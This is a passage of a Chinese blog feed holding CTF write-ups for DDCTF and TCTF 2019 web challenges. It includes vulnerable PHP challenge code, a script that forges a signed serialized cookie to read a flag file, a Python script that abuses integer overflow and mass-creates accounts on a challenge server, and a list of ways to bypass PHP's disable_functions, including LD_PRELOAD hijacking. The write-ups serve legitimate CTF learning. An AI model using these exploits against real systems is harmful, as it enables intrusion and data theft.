class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>; </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">\* Can you find the flag file? </span></span><br><span class="line"><span class="comment">\* </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sb的题目。。凸(艹皿艹 ) 最后是看其他人提示的<code>practice.txt.swp</code>，得到hint，flag的文件名为<code>f1lg!ddctf.php</code>。这样的话结合上面的替换就可以绕过正则的过滤。。。明显的为了出题而出题，强行构造的畸形题目。 </p><p>最后提交<code>f1lgconfigddctf.php</code>，就能拿到源码。 </p><p>之后看其他人的WP，才发现是通过源码中给的链接搜索到其他文章中的提示，在vi编辑器非正常退出之后会有swp文件残留，这文章就有一个例子。。。无力吐槽这个脑洞。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>); </span><br><span class="line">$k = <span class="string">'hello'</span>; </span><br><span class="line">extract($_GET); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid)) </span><br><span class="line">&#123; </span><br><span class="line">    $content=trim(file_get_contents($k)); </span><br><span class="line">    <span class="keyword">if</span>($uid==$content) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> $flag; </span><br><span class="line">    &#125; <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span><span class="string">'hello'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>好吧继续看<code>hello</code>，发现是空的，那么uid也为空就可以了，直接提交<code>uid=</code>，拿到flag。总结一下，sb的题目。 </p><p>DDCTF{436f6e67726174756c6174696f6e73} </p><p>之后发现这里<code>extract</code>注册了变量，所以也可以用变量覆盖的思路来处理这道题。比如<code>k</code>设置成我们服务器上的某个文件，然后<code>uid</code>再设置成相应的值。 </p><h2 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h2><p>首先看到没有权限的提示，看了一遍文件，发现有ajax请求，然后它的ddctf_username设置为空，看来是要设置一个值才行，一开始以为是自己的用户名，最后试出来的<code>admin</code>，给了另外一个路径。 </p><p>访问之后给了源码。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">app/Application.php </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123; </span><br><span class="line"><span class="keyword">var</span> $path = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123; </span><br><span class="line">$ret = [<span class="string">'errMsg'</span> =&gt; $errMsg, </span><br><span class="line">        <span class="string">'data'</span> =&gt; $data]; </span><br><span class="line">$ret = json_encode($ret); </span><br><span class="line">header(<span class="string">'Content-type: application/json'</span>); </span><br><span class="line"><span class="keyword">echo</span> $ret; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123; </span><br><span class="line">$DIDICTF_ADMIN = <span class="string">'admin'</span>; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123; </span><br><span class="line">    <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">TRUE</span>; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>); </span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123; </span><br><span class="line">$path = trim($path); </span><br><span class="line">$path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path); </span><br><span class="line">$path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path); </span><br><span class="line"><span class="keyword">return</span> $path; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123; </span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path); </span><br><span class="line">    <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123; <span class="comment">// path长度必须为18 ....//././config/flag </span></span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">app/Session.php </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123; </span><br><span class="line"><span class="comment">//key建议为8位字符串 </span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration = <span class="number">7200</span>; </span><br><span class="line">    <span class="keyword">var</span> $cookie_name = <span class="string">'ddctf_id'</span>; </span><br><span class="line">    <span class="keyword">var</span> $cookie_path = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">var</span> $cookie_domain = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">var</span> $cookie_secure = <span class="keyword">FALSE</span>; </span><br><span class="line">    <span class="keyword">var</span> $activity = <span class="string">"DiDiCTF"</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;get_key(); <span class="comment">// ../config/key.txt 的内容 </span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123; </span><br><span class="line">            $data = <span class="string">'DiDI Welcome you %s'</span>; </span><br><span class="line">            $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]); </span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;session_create(); </span><br><span class="line">            $data = <span class="string">'DiDI Welcome you'</span>; </span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="comment">//eancrykey and flag under the folder </span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;eancrykey = file_get_contents(<span class="string">'../config/key.txt'</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name]; <span class="comment">//ddctf_id </span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123; </span><br><span class="line">         <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>); </span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hash = substr($session,strlen($session)<span class="number">-32</span>); <span class="comment">// 最后32位为hash </span></span><br><span class="line">    $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>); <span class="comment">// 前面为session </span></span><br><span class="line">    <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123; <span class="comment">// 做验证 </span></span><br><span class="line">        <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">$session = unserialize($session); <span class="comment">//触发反序列化读文件 </span></span><br><span class="line">    <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123; </span><br><span class="line">        $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey); </span><br><span class="line">        $data = <span class="string">"Welcome my friend %s"</span>; </span><br><span class="line">        <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123; </span><br><span class="line">            $data = sprintf($data,$v); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123; </span><br><span class="line">        <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123; </span><br><span class="line">        <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">TRUE</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    $sessionid = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123; </span><br><span class="line">        $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax()); </span><br><span class="line">    &#125; </span><br><span class="line">    $userdata = <span class="keyword">array</span>( </span><br><span class="line">        <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)), </span><br><span class="line">        <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>], </span><br><span class="line">        <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], </span><br><span class="line">        <span class="string">'user_data'</span> =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">    ); </span><br><span class="line">    $cookiedata = serialize($userdata); </span><br><span class="line">    $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata); </span><br><span class="line">    $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time(); </span><br><span class="line">    setcookie( </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cookie_name, </span><br><span class="line">        $cookiedata, </span><br><span class="line">        $expire, </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cookie_path, </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cookie_domain, </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cookie_secure </span><br><span class="line">    ); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session(); </span><br><span class="line">$ddctf-&gt;index(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的突破口在密钥上，一开始认为是利用hash扩展攻击，但是不对，后来经友人提醒才发现忘记了<code>sprintf</code>，这里有格式字符串问题。传入<code>%s</code>让格式字符串保持拥有<code>%s</code>，就可以拿到密钥了。 </p><img src="/2019/04/19/2019ddctf-my-solutions-writeup/1.jpg"><p><code>EzblrbNS</code>，拿到之后我们就可以对数据做签名，来绕过hash验证。最后通过反序列化触发Application类的魔法函数，可以读取文件，path有一个限制长度必须为18。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123; </span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">'..././config/flag.txt'</span>; </span><br><span class="line">&#125; </span><br><span class="line">$userdata = <span class="keyword">new</span> Application(); </span><br><span class="line">$cookiedata = serialize($userdata); </span><br><span class="line"><span class="keyword">echo</span> $cookiedata; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>; </span><br><span class="line">$key = <span class="string">'EzblrbNS'</span>; </span><br><span class="line">$hash = md5($key.$cookiedata); </span><br><span class="line"><span class="keyword">echo</span> urlencode($cookiedata.$hash); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里考虑到<code>preg_replace</code>可以采用递归写法绕过，同时结合源代码分析，我们就知道只要绕过hash验证就能随意反序列化，为了让代码更加简洁，我们只需要生成<code>Application</code>对象，并且让<code>path</code>为flag路径就可以了。 </p><p>最后代入cookie，提交请求，可以看到flag。 </p><img src="/2019/04/19/2019ddctf-my-solutions-writeup/2.jpg"><h2 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h2><p>第一步是要通过整数溢出让价格的值变成0，这样我们就可以0元购买了。这里其实如果校验的时候小心一点，应该是不会出现这种情况的。但是我在测试的时候也没有完全测试好，整数溢出后是会变成最小负数，然后开始不断增加。所以这里最后的<code>value</code>为<code>4294967296</code>。 </p><p>之后就是注册用户，买票，拿到ticket和id，删除用户，这里比较坑的是要看删除用户的id，每个id都要删一次，所以到最后会特别慢。。。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> json </span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line">my_header = &#123; </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'user_name=whz1; REVEL_SESSION=785438359f65951fe7d8314e77e4f846'</span>, </span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'application/json'</span> </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_user_delete</span><span class="params">(username, password)</span>:</span> </span><br><span class="line">    register_url = <span class="string">'http://117.51.147.155:5050/ctf/api/register?name=&#123;&#125;&amp;password=&#123;&#125;'</span>.format(username, password) </span><br><span class="line">    buy_url = <span class="string">'http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296'</span> </span><br><span class="line">    r = requests.get(register_url) </span><br><span class="line">    re_result = re.match(<span class="string">r'user_name=(.*?); .*REVEL_SESSION=(.*?); .*'</span>, r.headers[<span class="string">'Set-Cookie'</span>]) </span><br><span class="line">    bot_headers = &#123; </span><br><span class="line">        <span class="string">'Cookie'</span>: <span class="string">'user_name=&#123;&#125;; REVEL_SESSION=&#123;&#125;'</span>.format(re_result.group(<span class="number">1</span>), re_result.group(<span class="number">2</span>)), </span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'application/json'</span> </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] buy chiji ticket .......'</span> </span><br><span class="line">    bill_info = requests.get(buy_url, headers=bot_headers) </span><br><span class="line">    bill_id = json.loads(bill_info.content)[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>] </span><br><span class="line">    pay_url = <span class="string">'http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&#123;&#125;'</span>.format(bill_id) </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] pay chiji ticket .......'</span> </span><br><span class="line">    time.sleep(<span class="number">1</span>) </span><br><span class="line">    ticket_info = requests.get(pay_url, headers=bot_headers) </span><br><span class="line">    bot_id = json.loads(ticket_info.content)[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_id'</span>] </span><br><span class="line">    bot_token = json.loads(ticket_info.content)[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_ticket'</span>] </span><br><span class="line">    delete_url = <span class="string">'http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;&#125;&amp;ticket=&#123;&#125;'</span>.format(bot_id, bot_token) </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] delete bot user ......'</span> </span><br><span class="line">    my_info = requests.get(delete_url, headers=my_header) </span><br><span class="line">    <span class="keyword">return</span> my_info.text </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">700</span>): </span><br><span class="line">    name = <span class="string">'ppzllac'</span> + str(n) </span><br><span class="line">    passwd = <span class="string">'12345678'</span> </span><br><span class="line">    <span class="keyword">print</span> create_user_delete(name, passwd)</span><br></pre></td></tr></table></figure><img src="/2019/04/19/2019ddctf-my-solutions-writeup/3.jpg"><h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload IMG"></a>Upload IMG</h2><p>一道上传题目，但是不是传统的上传，没有服务器解析漏洞，没有后端验证绕过，这里是要求上传的图片中包含<code>phpinfo</code>。一开始我完全懵逼，用的思路是之前GoogleCTF的思路，将字符串用PIL库填充进去，发现上传之后还是提示没有phpinfo。 </p><p>之后在友人的提醒下，看了<code>https://paper.seebug.org/387/</code>，还有<code>https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg</code>。这两篇文章知道了，这里的考点是GD渲染绕过的问题，再加上我们重新下载渲染过的图片之后发现图片首部由GD的标志。 </p><p>这里一开始是直接用的seebug中的脚本，但是我们发现脚本生成的图片再次渲染之后还是会让<code>phpinfo()</code>中的尾部字符串被解析成乱码。之后想到先上传一次文件，先让GD渲染一次把渲染的图片下载下来，这样再利用下载的文件就让渲染修改的地方不会有很多，最后是一次就成功了。 </p><img src="/2019/04/19/2019ddctf-my-solutions-writeup/4.jpg"><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>从流量数据包中能够发现三张图片，其中有两张是可以从网上直接下载得到的。还有一张是只能从数据包中提取得到。从中拿到之后一开始是无法显示的损坏png图像，需要修复png的图片头部和尾部才能正常使用。 </p><p>然后就是常见的套路了，修改图片的长度高度，这里是得到了一串key，再结合流量包中的解密网址就可以对图片完成解密，拿到加密的数据。 </p><p>解密网址 <a href="http://tools.jb51.net//aideddesign/img_add_info" target="_blank" rel="noopener">http://tools.jb51.net//aideddesign/img_add_info</a> </p><p>加密数据<code>flag+AHs-44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D+AH0-</code> </p><p>这是一个base64+hex数据，hex解密之后就是flag了。 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我得说DDCTF真的是脑洞太大，一言难尽。。。 &lt;/p&gt;
&lt;h2 id=&quot;滴&quot;&gt;&lt;a href=&quot;#滴&quot; class=&quot;headerlink&quot; title=&quot;滴~&quot;&gt;&lt;/a&gt;滴~&lt;/h2&gt;&lt;p&gt;文件包含，需要一些转换。转成hex值之后两次base64。 &lt;/p&gt;
&lt;figu
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2019TCTF web writeup</title>
    <link href="https://hurricane618.me/2019/03/31/2019TCTF-web-writeup/"/>
    <id>https://hurricane618.me/2019/03/31/2019TCTF-web-writeup/</id>
    <published>2019-03-31T14:15:47.000Z</published>
    <updated>2019-03-31T14:20:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="wallbreaker-easy"><a href="#wallbreaker-easy" class="headerlink" title="wallbreaker easy"></a>wallbreaker easy</h2><p>这道题在比赛的时候专注在imagick上面，但是由于是最新版本，以前的bypass漏洞已经修补。。。之后由于复试的原因没有仔细研究，现在开始复现。</p><p>这道题给了一个webshell，密码是backdoor，可以直接用菜刀连接，然而用phpinfo查看禁用函数，发现已经把所有执行命令的函数都ban了，并且知道操作系统是ubuntu18.04.</p><img src="/2019/03/31/2019TCTF-web-writeup/1.png"><p>所以这是一个受限制的webshell绕过<code>disable_function</code>的问题</p><h3 id="bypass-disable-function的方法"><a href="#bypass-disable-function的方法" class="headerlink" title="bypass disable_function的方法"></a>bypass disable_function的方法</h3><p>绕过<code>disable_function</code>也是一个老生常谈的问题了。总结一下大概有一下四种：</p><ol><li>攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞</li><li>寻找未禁用的漏网函数，常见的执行命令的函数有 <code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>passthru()</code>，偏僻的 <code>popen()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>，逐一尝试，或许有漏网之鱼</li><li>mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制</li><li>利用环境变量 <code>LD_PRELOAD</code> 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果</li></ol><p>这里由于题目的提示，我们知道php没有多余的组件。也没有漏网之鱼，同时也没有mod_cgi。那么剩下的就是<code>LD_PRELOAD</code>劫持函数的方法了。</p><p>这个一个动态链接的环境变量，在我们执行程序的时候会优先加载这个变量中的动态函数库，如果这个里面有程序用到的库函数就会调用，这样的话我们就可以劫持库函数执行恶意操作。</p><h3 id="劫持库函数"><a href="#劫持库函数" class="headerlink" title="劫持库函数"></a>劫持库函数</h3><p>这里由于要先设置环境变量，那么触发的函数必须要能启用外部程序才行，这样才会有调用动态库的情况。比如php中的<code>mail()</code></p><img src="/2019/03/31/2019TCTF-web-writeup/2.png"><p>可以看到调用了外部程序<code>sendmail</code>，这里的经典方法是劫持<code>getuid()</code>，因为<code>sendmail</code>会调用这个函数，但是这里会出现一些问题，如果没有<code>sendmail</code>或者禁用了，这就不会有外部程序运行，当然我们劫持的函数也无法执行。</p><p>这里有一种更进一步的利用方法，就是使用<code>__attribute__ ((__constructor__))</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; 